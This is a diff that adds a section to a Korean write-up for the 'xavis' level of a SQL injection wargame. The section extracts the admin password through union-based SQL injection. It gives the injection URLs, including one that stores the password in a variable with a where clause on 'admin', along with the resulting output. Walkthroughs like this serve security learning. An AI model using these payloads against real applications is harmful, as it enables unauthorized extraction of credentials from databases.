@@ -109,3 +109,58 @@ print("Password : {0} (Hex : {1})".format(result, hex_result))
 
 코드를 실행시키면 `pwlen`은 40이 나오며, `pw`값은 `¸ùÅ°ÆÐÄ¡¤»`로 괴상한 값이 나오게 된다.
 이 `pw`를 그대로 URL에 대입하거나 Hex 값으로 변환한 `0xb8f9c5b0c6d0c4a1a4bb`를 `pw`값으로 넣어주면 문제 풀이에 성공하게 된다.
+
+---
+
+## 추가 문제 풀이
+
+`Blind SQL Injection`을 하지 않고 `xavis` 문제를 해결하는 방법을 추가합니다.
+
+`xavis` 문제의 url에 직접 `union`과 변수를 이용하여 `pw`값을 출력시키는 방법이 존재한다.
+
+```
+http://los.eagle-jump.org/xavis_****.php
+```
+
+위의 URL에 `?pw='`로 `pw`문을 임의로 닫은 후
+
+```
+http://los.eagle-jump.org/xavis_****.php?pw='
+```
+
+`or`을 이용하여 임의로 `query`문을 대입한다.
+
+`db` 내에 있는 `pw` 값을 변수에 담아 저장한 후 `union`을 통해 추가한다.
+
+```
+http://los.eagle-jump.org/xavis_****.php?pw=' or (select @a:=pw) union select @a -- ;
+```
+
+`a` 라는 변수에 `pw` 값을 대입한 후 `union`을 통해 `pw` 값을 출력시키게 한다.
+
+위와 같이 `Union SQL Injection` 을 진행해보면,
+
+```
+Hello fnfmfkalfnfmffnfmf
+```
+
+와 같이 `db`의 `pw` 값이 출력되는 것을 확인할 수 있다.
+
+이는 현재 조건문을 걸어주지 않고 변수에 담은 임의의 값이기 때문에, `where` 절을 이용하여 `id`가 `admin`일 때의 `pw` 값을 변수에 담아 출력하도록 하면 된다.
+
+```
+http://los.eagle-jump.org/xavis_****.php?pw=' or (select @a:=pw where id='admin') union select @a -- ;
+```
+
+위처럼 `Union SQL Injection`을 진행하면,
+
+```
+Hello ¸ùÅ°ÆÐÄ¡¤»
+```
+을 출력하게 되므로, `id`가 `admin`일 때의 `pw` 값은 `¸ùÅ°ÆÐÄ¡¤»` 임을 알 수 있게 된다.
+
+```
+http://los.eagle-jump.org/xavis_****.php?pw=¸ùÅ°ÆÐÄ¡¤»
+```
+
+`pw`에 `¸ùÅ°ÆÐÄ¡¤»` 을 대입하면 문제 풀이에 성공하게 된다.
